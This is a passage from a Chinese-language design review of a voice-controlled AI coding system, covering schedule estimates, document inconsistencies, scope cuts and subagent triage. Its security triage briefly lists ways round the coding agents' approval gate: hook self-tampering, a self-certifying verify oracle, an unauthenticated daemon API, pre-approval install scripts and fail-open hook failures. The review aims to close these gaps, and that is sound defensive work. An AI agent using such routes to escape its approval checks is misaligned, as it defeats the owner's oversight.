- 建议:1.2b 计入 Phase 1(改 7–10 天)或计划头给"含税区间";P0.5 按"A 契约封闭 2 天 + B bridge 4–7 天 + C 直达全链 2–3 天 + D/E/收尾 3–4 天"分项重估。**不必改承诺,但预期要按 1.4× 校准**——owner 已裁"首发求完整不求快",诚实工期与该裁定并不冲突。

**I4 [B] ASR spike 的种子集与裁决阈值缺失(Codex 08 B-09 残余)**【SA4】
- 1.0 要"50–100 条种子中英混说跑分",种子来源/录制授权未定义(TTS 合成种子会失真);对比腿 gpt-4o-transcribe 依赖 billing 有问题的 OpenAI key;WER/术语准确率/首包 P50/P90/两家皆败分支的阈值仍无。
- 建议:Phase 1 前定种子来源(owner 录/历史语料)、给对比腿备可用凭据或降为 volc vs MLX-Whisper、写死阈值。

**I5 [B] 自动快照备份与 hard-forget 删除传播互相打架**【SA3 ⊕ SA4 交叉】
- 0.1 建"SQLite/JSONL/knowledge 定时快照备份";§4 的 forget_hard `stores` 含 "backup",但快照备份不可就地删——G6 的删除传播对备份出不了绿证据(Codex 08 A-02 点名过 crypto-erasure/retention 口径,仍无定义)。
- 建议(推荐前者):**P0 砍自动快照备份**(knowledge 已 git 版本化、SQLite 可手动快照),或定义"备份保留 N 天自动滚动失效"的删除口径并入 §12-4。

**I6 [B] jq 是审批门安全关键依赖,不在任何前置清单;钩子脚本崩溃语义未实测**【SA4】
- 09 §11"钩子 JSON 必用 jq(畸形 fail-open)",spike run.sh 也依赖 jq——但 Phase -1 B 与 IMPL-PROMPT 清单均无 jq(本机恰好有,侥幸);且"gate.sh 自身崩溃/jq 缺失时 CLI 按 fail-open 还是 fail-closed"未实测,G4 凭据剥离后的 worktree 环境 PATH 可及性也需断言。
- 建议:Phase -1 B 补 jq(顺带 just——计划正文也漏,只在 IMPL-PROMPT 有);worktree 供给 preflight 断言 jq 可执行;0.0(a) 补"脚本崩溃语义"一测。

**I7 [B] WS 契约的 canonical 承载不足,Phase 1 中段必触发一次回写税**【SA4;Codex 08 B-08 残余】
- 计划 1.2 要求"09 §10 WS 契约(sessionId/seq/health + 版本/重连)",但 09 §10 的 union 无 hello/version、音频格式、ack/重连游标、背压/关闭码——按"先回写文档再改代码"纪律,这笔回写会落在 Phase 1 关键路径上。
- 建议:Phase 1 开工前一次性把 wire envelope 回写 09 §10(半天),消掉中段停顿。

**I8 [C] dogfood 与 P0.5 施工共用同一会话/同一 owner,bug 处理优先级未定义**【SA4】
- 建议:P0.5 期间 dogfood 问题缺省"记账不即修,A 级安全类除外",防 6–9 天(已偏紧)被隐性挤占。

---

## 5. 错误与不一致(逐条,可直接开修)

> 判定标准:同一事实两处 canonical 冲突,或已被裁决推翻仍未回改,且不在已声明的 [warn] 豁免范围内(豁免内但建议尽快回改的标 △)。E1–E12 为主评审发现,E13 起为 subagent 新增。

| # | 级别 | 位置 | 问题 | 修法 |
|---|---|---|---|---|
| E1 | B | `docs/03` §5 | 仍写 Cursor = [fail] 运行中交互审批、Tier 2;07 D8 + spike 已实证 cursor_cli 经 hooks 做 Tier 1,且已是 dev 缺省【主 ⊕ SA2】 | 矩阵补 cursor hooks 行注;Tier 分档按"审批回调能力"而非厂商名 |
| E2 | B | `docs/06` §5 术语表 | Tier 1/2 定义同旧口径;**AGENTS.md 规定"术语口径以 06 为准",此错会被实施者优先信任**【SA2 强化】 | 随 E1 回改 |
| E3 | A | `IMPL-PROMPT.md` 尾部 | "fail-closed **三律**" vs 计划 4.1/09 §11 "**四律**"(缺"每条命令独立审批"),spike 明确警告过便车风险【主 ⊕ SA4】 | 改四律,与 09 §11 逐字对齐 |
| E4 | B | `AGENTS.md` | canonical 范围仍写 01–08 + adr/,漏 09/10(Codex 08 C-7 残留)【主】 | 改 01–10 + adr/ |
| E5 | C | `docs/10` §2 表 | #12 行"期"列标 P0,与头部 [warn] (P0.5)矛盾【主】 | 表内改 P0.5 |
| E6 | C | `research/README.md` | 对接 prompt 标 "v2,16 项",实为 v4/17 项且已获裁决【主】 | 更新 |
| E7 | C | `docs/06` §1 | 未收录 codex-findings 06/07/08/09 四份报告【主】 | 补四行 |
| E8 | A | 计划 0.0 / 风险表 / 4.0 | 三处后端口径互斥 + 4.0"三能力"未随 0.0 升四能力【主 ⊕ SA4,详见 §4-I2】 | 统一:两后端皆不成立才停;claude 单独不成立 ⇒ 上浮定缺省归属;4.0 改四能力 |
| E9 | C | `docs/02` §5.1 / `docs/08` §6 | "三处模型"与 07/09/模板五槽位不一致【主】 | 补齐五槽位口径 |
| E10 | C | `docs/09` §13 | `issueDispatchReceipt` 重复定义两次【主 ⊕ SA2】 | 删一处 |
| E11 | △ | `docs/05` §4 Gate 0 表 G1 | "软过滤"与计划 G1 诚实口径("无声纹不造假")差异,计划已声明待回写【主】 | 现在回写,不留时间差 |
| E12 | C | `docs/09` §2 | cost 的 Money 内外币种重复且 max 裸 number 固定 CNY【主】 | max 也用 Money(known 恒 true) |
| E13 | B | `docs/04` §5.2 vs `09` §3/§13 | decision 词表 4 值/5 值/2 值三处不一致;respond 无 outcome 出边;语音 ignore 不可达【SA2】 | 统一五值回写 04;respond 定出边或删;approveAction 对齐 |
| E14 | B | `09` §6.3 vs `10` #30 | blocked occurrenceKey 两处定义冲突(episode 序号 vs event_id)【SA2】 | 09 定唯一口径,10 引用 |
| E15 | B | `09` §9 vs 计划 0.3 | schema_migrations 注"v1 = 本表全集" vs 0.3"不含 dispatch_bindings/hopper_commands(属 P0.5-B)"——Phase 0 首周即冲突【SA2】 | 09 注明 v1 分 Tier1 子集/P0.5 增量,或计划改 |
| E16 | C | `09` §2/§12 | 引用"§11-2 测试/反例①"应为 §12-1/§12-2(Codex 08 C-3 半修)【SA2】 | 修引用 |
| E17 | C | `docs/03` §4 / §5 | confirm_and_dispatch"参数含预授权清单"与 §13 签名漂移(清单在 package 不在参数);"kill_and_resume" vs §13 "cancel_resume" 命名未统一【SA2】 | 随 E1 一并回改 03 |
| E18 | C | `09` §11 `[gate0]` | `enabled=false` 语义仍未定义(Codex 08 C-4 半修)【SA2 ⊕ SA4】 | 定义为"非法配置,启动拒"或删键 |
| E19 | C | `IMPL-PROMPT.md` | 三处陈旧:①"抄模板末尾 dev profile 块"(dev 已拆独立文件);②"一项 owner 动作"实列四五项;③ 0.5"不等裁决"与头部"裁决已回"矛盾【SA4】 | 发前顺手改 |
| E20 | C | 计划 Phase -1 B | 环境清单漏 `just`(只在 IMPL-PROMPT 有)与 `jq`(哪都没有,见 §4-I6)【SA4】 | 补两项 |
| E21 | A | 计划 Phase -1 D | "均已完成"失实(hopper-dist/vault 不存在,已复核)【SA4】 | 见 §4-I1 |
| E22 | B | `docs/adr/ADR-001` 操作表 | "改需求 = cancel + 重 drop(supersede 关联)"未随 v2.2 ⑥"同卡修订缺省"回填【SA2】 | 见 §4-C3 |
| E23 | C | `09` §7 / §13 | TaskView 四个本地态(confirmed/paused/cancel_requested/superseded)无用户语言显示词;10 #27 切档话术缺 Hopper cancel-new-run 分支(A7 关闭宣称"话术按 capability 分支"未兑现)【SA2】 | §7 或 §13 补四条显示词;#27 补分支 |

## 6. 过度设计与可裁剪项

> 总体:这套设计的"重"多数是**承重的重**。可裁的集中在下列几处;标【不采纳】的是 subagent 提出但经权衡不建议裁的,理由附后(完整 triage 见 §9)。

**O1 [上浮 owner] dev-profile BYOA 特例链 vs 直接实测/购入 Claude**【主;SA4 的 .env 发现使其更便宜】
"不依赖 Claude"催生的整条特例链(evaluator 放宽 + 双开关 + unproven 标记 + cursor 专用 parser 六类 golden + 笼分档 + 成对互换校验)≈ 2.5 天编码 + 长期维护税。本机既然已有 ANTHROPIC_API_KEY,先实测(§4-I2);通过则 evaluator 走 claude_cli(产品缺省,零特例)、Tier 1 走 claude_sdk,dev-profile 整条降级为"保留设计、缓实现"。**花小钱删复杂度。**

**O2 [B] P0 控制台 11 路由收敛到 6 页**【主;SA3 从攻击面角度加持】
P0 单项目单任务下,记忆/产物/成本/通知四页浏览价值极低(数据在库,不看不丢);且在 daemon API 补鉴权前,每个路由都是 §4-S3 的额外入口。收敛为 Dashboard/对话/任务看板/任务详情(review 证据)/审批/全局设置六页,其余出壳占位;省出 1–2 天投给 review 证据视图与 C1 返工循环。

**O3 [B] billing-switch 收据最薄化(四方共识,本文最高置信的裁剪项)**【主 ⊕ SA2 ⊕ SA3 ⊕ SA4】
纯成本决策配了 S2 级收据机器。实现收敛为:复用 `approvals` 表(kind 加一枚举值)+ 两条测试(未确认不产生 `source='api'` 行、单次消费);竞态矩阵延 P0.5/P1。守住的承诺不变:绝不静默转计费。**若实现要写超过 ~100 行专属代码,即走偏信号。**

**O4 [C] Demo 生成器缺门控规则**【SA1】
"Demo(可能的话)"未定义何时**不**做;S1 高频小任务上 Demo 是纯延迟+成本,主要受益人是 S2/S3(P2/P3)。P0.5-E 前定义生成门控(UI 向/新界面/大改动才生成;Quick 车道默认不生成),埋点 Demo 查看率。

**O5 [C] 深评调用律部分延后**【SA2,部分采纳】
04 §2.2 分层触发已把深评压到每会话 1–3 次,再叠"去重键+上限+冷却 60s+并发预检"四条律是给被上游消灭的问题加保险。P0 保留 evidenceDigest 去重(免重复计费),上限/冷却/并发预检待 dogfood 出现真实挤兑再加。

**O6 [C] 0.5 手动 PoC 压缩**【SA4,部分采纳】
立项理由"不等裁决"已消失(裁决当日已回);P0.5-D 还要复跑同八条。压缩为 1–2 天"现状 CLI 八条冒烟对照"(保留其第二价值:让 AI 实施者摸熟 Hopper 现状 CLI),不再作为独立 3–4 天块。

**O7 [C] 其余可裁/可缓项(打包)**
- `[providers.api.*]` 多命名档与端点级 family 反例:P0 只留实际用的 1–2 档,其余模板注释保留【SA4】;
- 处方化报错的"结合 .env 现状动态建议"深度:P0 清晰报错即可,处方化 UX 缓做(校验器报错质量本身保留——对 AI 实施者也有用)【SA4,部分采纳】;
- 非 coding 类型模板内容(02 §5 表)标注"示意,接入时重审",防被"实施照抄"纪律误伤【SA1】;
- 话术表预告 v1.1"dogfood 后集中修订轮",golden 保持要素级断言不逐字(现状如此,守住)【SA1】;
- observedModel 对**官方直连端点**的"缺字段即作废"可降为首次握手断言,每次强制留给网关/BYOA——**注意与 Codex 09-A4 裁决冲突,归 owner**【SA3,部分采纳】;
- forget_hard 崩溃相位重放的严格性:P0 store 少,"删+重启全量重放校验"即同效,独立相位/job 本就 P0.5【SA3】。

**【不采纳】记录(见 §9 理由)**:familyOf 前缀表 fail-closed 降级(SA2)——护栏承重且成本低;requeued/resolution-timeout 推 P1(SA2)——防"ack 后睡着"是真实场景、机制薄;expects 全局尾 CAS 砍除(SA2)——降为"仅 approve/merge 两命令最薄使用",不整体砍。

## 7. 整合后行动清单(按优先级)

| 优先级 | 动作 | 落点 | 成本 |
|---|---|---|---|
| **A(发实施 prompt 前)** | C1 返工循环:状态机三条边 + reviewTask 工具 + 话术 3–4 条 + 反例 | 09 §6.1/§13、10 §2.4 | 0.5–1 天 |
| A | C2 memory_events DDL 补列/判别存储 + generation 落点 | 09 §4/§9 | 0.5 天 |
| A | C3 cancel_settled 双边拆分 + queued cancel 边 + ADR 回填 | 09 §6.1、ADR-001 | 0.5 天 |
| A | S1/S3 执行侧安全:钩子出 worktree + canary + 版本 pin;daemon API 令牌鉴权 | 计划 0.0(a)/1.x/4.1、Gate 0 | 1 天设计 |
| A | I1/E21 Phase -1 D 改口 + Hopper 副本落地;E3 四律;E8 后端口径统一 | 计划、IMPL-PROMPT | 0.5 天 + owner 装机 |
| A | P1 dogfood 评估门(度量表 + 停/转信号) | 计划 Phase 5/dogfood gate | 0.5 天 |
| A→owner | I2/O1:用现有 ANTHROPIC key 实测 claude_sdk 定生死(§8-1) | owner + 0.0(b) | 半天 |
| B(对应 Phase 前) | S2 verify 内容 digest;S4 setup --ignore-scripts;S5 cursor egress 声明 | 09 §11、计划 4.1 | 1 天 |
| B | C4–C8 契约收口(词表/occurrenceKey/trigger/投影洞/tier1 转换表) | 09、10 | 1 天 |
| B | P2 排队话术;P3 预算耗尽收口;P4 文字轮次;P5 评估器抽查;P6 auto_low_impact 机械判定;P7 redaction golden;P8 多 pending 反例 | 10、09、计划 | 1.5 天 |
| B | I3 工期 1.4× 校准声明;I4 ASR 种子/阈值;I5 砍自动备份;I6 jq/just;I7 WS 契约回写前置 | 计划、09 §10 | 1 天 |
| B | O2 控制台收敛 6 页;O3 billing-switch 最薄化 | 计划 5.1/5.2、1.2b | 省 1–2 天 |
| C(攒批) | E 系列冻结 sweep(E1–E23 一次清)+ §3.3 盲区表态 + 语言边界 + P10 小项 + O4–O7 | 各文档 | 1 天 |

> 合计新增约 7–9 个工作日的设计/回写量(部分与 O2/O3 的节省相抵)。相对 P0 全程,这是把"第一周就会撞的墙"提前拆掉的成本。

## 8. 待 owner 拍板的问题(浓缩版)

1. **Claude 后端三合一决策**(§4-I2/§6-O1):本机已有 ANTHROPIC_API_KEY——是否授权在 0.0(b) 用它实测四能力?通过后是否以 claude_sdk 为日用后端、dev-profile 特例链降级缓做?我的建议:**测,通过就用**。
2. **返工循环的 Tier 1 语义**(§4-C1):同 task 新 attempt(推荐,复用 worktree/收据/回叫链)还是 supersede 新卡?
3. **执行侧安全四件套**(§4-S1/S3/S4 + S2):按建议进 Gate 0 与计划?(工程性质,但动 canonical 需你点头)
4. **P0 控制台收敛 6 页**(§6-O2):接受否?
5. **工期口径**(§4-I3):接受"28–38 / 10–16 工程日"的 1.4× 校准表述,还是维持原口径但显著标注"理想下限"?
6. **dogfood 评估门**(§4-P1):认可指标表与停/转信号进计划?otherwise 请给出你自己的"值得继续"判据。
7. **自动快照备份**(§4-I5):砍(推荐)还是定义备份删除口径?
8. **文档冻结仪式**(§6-O5→§7 C 行):认可"E1–E23 清掉后 docs 冻结,此后只走实施期轻量回写通道"?
9. **三盲区 + 语言边界表态**(§3.3/§2):应急车道、回叫聚合、无障碍/文字模式、中文优先——各一句"P 几或非目标"。
10. **observedModel 官方端点放宽**(§6-O7 末条):与 Codex 09-A4 裁决冲突,是否放宽归你。

---

## 9. 四个 subagent 独立评审的吸收(triage 记录)

### 9.0 方法与独立性

四个 subagent 并行、只读、互不知晓;prompt 仅含"已知问题登记表"(Codex 已修项、09 §14 已登记项、[warn] 已声明漂移)。SA3 主动披露读到了本文初稿(已落盘),其与初稿同向的 3 条(verify oracle/cursor egress/评估器独立性)按"深化"计,其余按独立计。SA4 对本机环境做了实测(hopper-dist、.env、jq、just),主评审复核了其中两项关键事实,属实。

### 9.1 SA1(产品市场)——核心结论与 triage

> 总判:"方向与克制经得起推敲,短板不在'能不能建成'而在'建成后凭什么说它值得'——补 dogfood 判据与验收-返工话术才算首尾闭环。"

| 发现 | 裁决 | 落点 |
|---|---|---|
| 1 dogfood 无判据/否决线(A) | **采纳**(与主 G6、SA4-11 三方合并) | §4-P1 |
| 2 验收-返工话术缺失(A) | **采纳**(与主 G1、SA2-1 三方合并) | §4-C1 |
| 3 P0 样本无法验证范式假设(B) | **采纳** | §1.2 修正二 |
| 4 P0"离席"名不副实(B) | **采纳**(预期管理+分组度量,不改分期) | §1.2 修正三 |
| 5 单队列无排队话术(B) | **采纳** | §4-P2 |
| 6 采访预算耗尽无收口(B) | **采纳** | §4-P3 |
| 7 首次激活无引导(C) | **采纳**(记录,第二用户前补) | §3.3-4 |
| 8 咨询型会话一等产出(C) | **采纳**(并入度量表) | §4-P1 |
| 9 中文单语硬编码(C) | **采纳**(与主交叉) | §2 |
| 10 首发前近邻重扫(C) | **采纳** | §4-P10f |
| 过度 1 Demo 门控(B) | **采纳** | §6-O4 |
| 过度 2 直达验收埋点(C) | **采纳**(档位分布/拒签率入度量) | §4-P1 |
| 过度 3 非 coding 模板标"示意"(C) | **采纳** | §6-O7 |
| 过度 4 话术"定稿"心态(C) | **采纳**(预告 v1.1 修订轮;golden 守住要素级) | §6-O7 |

### 9.2 SA2(架构契约)——核心结论与 triage

> 总判:"契约已具备照抄级骨架与安全根基,但主故事的验收-修订-合并后半程未闭合——修掉 3 个 A 级断链再发实施 prompt。"

| 发现 | 裁决 | 落点 |
|---|---|---|
| 1 review 环节双断链(A) | **采纳**(三方合并;其"人工合并推进链"与"用户主动取消边"是主评审未见的增量) | §4-C1 |
| 2 MemoryEvent vs DDL 脱节(A) | **采纳**(主评审复核属实) | §4-C2 |
| 3 cancel_settled 矛盾 + ADR 未回填(A) | **采纳**(复核属实) | §4-C3、E22 |
| 4 cursor Tier1 未 sweep 03/06(B) | **采纳**(与主 E1/E2 合并;其"06 是术语真相源"论证使级别更实) | §5-E1/E2 |
| 5 decision 词表三处不一致(B) | **采纳**(复核属实) | §5-E13 |
| 6 occurrenceKey 冲突(B) | **采纳**(复核属实) | §5-E14 |
| 7 outbox trigger 缺两值(B) | **采纳** | §4-C6 |
| 8 投影条件洞+他端取消非法边(B) | **采纳** | §4-C7 |
| 9 投影 7 词条无话术(B) | **采纳**(P0.5-B 前补) | §4-C7 附 |
| 10 tier1_runs 无转换表/retry 工具/blocked proof(B) | **采纳** | §4-C8 |
| 11 digest 矩阵漏行(B) | **采纳** | §4-C9 |
| 12 snapshots 主键撞(C) | **采纳** | §4-C9 |
| 13 攒批七项(C) | **采纳** | §5-E15~E18、E10 |
| 14 本地态无显示词(C) | **采纳** | §5-E23 |
| 15 #27 缺 Hopper 分支(C) | **采纳** | §5-E23 |
| 过度 1 billing-switch(C) | **采纳**(四方共识) | §6-O3 |
| 过度 2 familyOf fail-closed 降级 | **不采纳**:异族校验是防错链承重护栏,前缀表本就为解析而存在,fail-closed 增量成本≈一条校验规则;"新模型名拒启动"的烦恼已有出口(命名端点显式 family)。仅采纳"报错处方化"部分 | — |
| 过度 3 深评调用律延后 | **部分采纳**(留去重,缓上限/冷却/预检) | §6-O5 |
| 过度 4 expects CAS 砍除 | **部分采纳**:不砍(它是 Hopper 裁决给的过渡形态,批次 A 送到手),但实现收敛为仅 approve/merge 两命令上使用,不建通用预检框架 | §6 末 |
| 过度 5 requeued/resolution-timeout 推 P1 | **不采纳**:"ack 后睡着"是单用户也高发的真实场景,状态机已定稿、实现薄;仅电话级(level 2)测试本就 P1 | — |

### 9.3 SA3(安全治理)——核心结论与 triage

> 总判:"语音弱认证侧是最扎实的部分;该堵的是执行侧不经语音链的旁路——审批器自篡改、oracle 自证、API 无鉴权、供应链先于审批,任一成立,S0–S3 与所闻即所签在 Tier 1 实操中都可被绕过。"

| 发现 | 裁决 | 落点 |
|---|---|---|
| 1 钩子自指可篡改(A) | **采纳**(本轮最重安全发现) | §4-S1 |
| 2 verify oracle 双绕过(A→B) | **采纳**(深化主 G5;攻击路径完整) | §4-S2 |
| 3 localhost 无鉴权(A) | **采纳** | §4-S3 |
| 4 setup postinstall(B) | **采纳** | §4-S4 |
| 5 cursor 非 shell 通道(B) | **采纳**(与主 G3 弱点二合并) | §4-S5 |
| 6 auto_low_impact 无独立判定(B) | **采纳** | §4-P6 |
| 7 评估器信息源不独立(B) | **采纳**(与主 G7 合并) | §4-P5 |
| 8 dev 评估档定性"已知泄露"(B) | **部分采纳**:措辞修正采纳(unproven → 已知可读);sandbox-exec 加固列可选(dev-only、owner 自担) | §4-P9 |
| 9 TTS redaction 缺机械 enforcement(B) | **采纳** | §4-P7 |
| 10 backup store 删不到(C) | **采纳**(与 SA4 合并,推荐砍备份) | §4-I5 |
| 11 presentation 多 pending(B) | **采纳** | §4-P8 |
| 过度 1 billing-switch | **采纳**(四方共识) | §6-O3 |
| 过度 2 控制台收敛缩攻击面 | **采纳**(加持主 O2) | §6-O2 |
| 过度 3 observedModel 官方端点放宽 | **部分采纳**(与 Codex 09-A4 裁决冲突,列 owner 题) | §6-O7、§8-10 |
| 过度 4 forget_hard 相位重放简化 | **采纳**(P0 全量重放校验同效) | §6-O7 |

### 9.4 SA4(实施工程)——核心结论与 triage

> 总判:"已从 Codex 08 的'不可交付'修到'可开工':清掉两处 A 级文本硬伤、落地 Hopper 副本、工期按 1.4× 校准,即可放手开工。"其独立工期区间:P0 28–38 日、P0.5 10–16 日。

| 发现 | 裁决 | 落点 |
|---|---|---|
| 1 三律 vs 四律(A) | **采纳**(与主 E3 合并升 A) | §5-E3 |
| 2 claude 口径互斥 + .env 有 key(A) | **采纳**(已复核;实质更新主评审 G2) | §4-I2 |
| 3 Phase 1 算术不成立(B) | **采纳** | §4-I3 |
| 4 P0.5 低估未修(B) | **采纳** | §4-I3 |
| 5 Phase -1 D 失实(B→A) | **采纳**(已复核,升 A——交接材料失实比工期问题更致命) | §4-I1、E21 |
| 6 ASR 种子/阈值缺(B) | **采纳** | §4-I4 |
| 7 cursor 无版本锁(B) | **采纳**(并入 S1 三件套) | §4-S1 |
| 8 jq 缺清单+崩溃语义未测(B) | **采纳** | §4-I6 |
| 9 WS 契约回写税(B) | **采纳** | §4-I7 |
| 10 备份删除传播(B) | **采纳**(与 SA3 合并) | §4-I5 |
| 11 dogfood 无停/转信号(B) | **采纳**(三方合并) | §4-P1 |
| 12 IMPL-PROMPT 三处陈旧(C) | **采纳** | §5-E19 |
| 13 just/jq 清单不同步(C) | **采纳** | §5-E20 |
| 14 gate0 enabled=false(C) | **采纳**(与 SA2 合并) | §5-E18 |
| 15 dogfood bug 优先级(C) | **采纳** | §4-I8 |
| 过度 1 0.5 PoC 压缩 | **部分采纳**(压缩至 1–2 天,保留学习价值) | §6-O6 |
| 过度 2 providers 多档 | **采纳** | §6-O7 |
| 过度 3 billing-switch 测试矩阵 | **采纳**(四方共识) | §6-O3 |
| 过度 4 处方化报错降档 | **部分采纳**(报错质量保留,动态建议深度缓做) | §6-O7 |
| 过度 5 砍自动备份 | **采纳** | §4-I5 |

### 9.5 交叉确认矩阵(≥2 方独立命中 = 高置信)

| 发现 | 主 | SA1 | SA2 | SA3 | SA4 | 置信 |
|---|---|---|---|---|---|---|
| 验收-返工循环断链 | [ok] | [ok] | [ok] | | | 最高 |
| dogfood 评估门缺失 | [ok] | [ok] | | | [ok] | 最高 |
| billing-switch 最薄化 | [ok] | | [ok] | [ok] | [ok] | 最高 |
| cursor 审批门完整性(篡改/版本/canary) | [ok] | | | [ok] | [ok] | 高 |
| 三律 vs 四律 | [ok] | | | | [ok] | 高(已复核) |
| claude 后端口径/零 dogfood | [ok] | | | | [ok] | 高(已复核) |
| cursor Tier1 文档漂移(03/06) | [ok] | | [ok] | | | 高 |
| verify oracle 未冻结 | [ok] | | | [ok]* | | 高(*SA3 读过初稿,按深化计) |
| 评估器信息源独立性 | [ok] | | | [ok]* | | 中高(同上) |
| 备份与删除传播冲突 | | | | [ok] | [ok] | 高 |
| 中文单语边界 | [ok] | [ok] | | | | 中 |
| 控制台收敛 | [ok] | | | [ok] | | 中高 |

---

## 附:覆盖范围与限制

- 本轮全程**只读**,未修改任何 canonical 文档;所有建议需 owner 裁决后按流程回写。
- 未逐行核验:`demo/saydo-console-demo.html`(5.2 万字符,按 AGENTS.md 纪律仅确认其分期标注义务存在)、`research/spikes/` 两个 spike 的脚本细节(SA3/SA4 读了 RESULT.md 与 run.sh/hooks.json)、`history/voice-coding-framework.Cursor2.md`(前身文档,按已重组处理)。
- 本机事实核验(2026-07-23):`~/.saydo/hopper-dist`、`~/.saydo/hopper-vault` 不存在;`~/.saydo/.env` 存在且 OPENROUTER/OPENAI/ANTHROPIC/DOUBAO_TTS/VOLC 五 key 与 NTFY 两项均已设值(额度未验证;未读取任何密钥内容)。
- Codex 08 对计划 v2.0 的 No-Go 十项,经对照 v2.2 + 09 v1.1,大部分已落;本文 §4/§5 所列为四方核到的残余。实施期以 §12 契约测试为最终裁决。
- 一处主评审初稿的自我修正:初稿曾判"产品缺省后端零 dogfood 风险"需买订阅解决;SA4 实测发现本机已有 ANTHROPIC_API_KEY,问题降级为"先实测再决定",已按此更新(§4-I2)。
